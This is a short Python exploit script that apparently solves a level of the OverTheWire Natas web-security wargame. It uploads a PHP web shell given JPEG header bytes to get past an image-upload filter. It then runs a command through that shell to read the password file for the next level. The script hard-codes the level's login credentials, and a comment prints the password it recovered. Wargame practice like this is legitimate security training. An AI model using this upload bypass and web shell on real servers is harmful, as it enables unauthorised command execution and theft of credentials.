import requests
import re

""" exif_shell.php
ÿØÿà<? passthru($_GET["c"]); ?>
"""

# first upload specially crafted exif_shell.php to the server
auth = requests.auth.HTTPBasicAuth('natas13','jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY')
files = {'uploadedfile': open('exif_shell.php','rb')} 
data = {'filename':'exif_shell.php', 'MAX_FILE_SIZE': '1000'}
url = 'http://natas13.natas.labs.overthewire.org/'
response = requests.post(url, auth=auth, data=data, files=files)

# then run command through shell to obtain password for next level
path = re.findall('The file <a href="upload/(.*).php">', response.text)[0]
url = 'http://natas13.natas.labs.overthewire.org/upload/'+path+'.php?c=cat%20/etc/natas_webpass/natas14'
response = requests.get(url, auth=auth)
print(response.text[4:]) # Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1

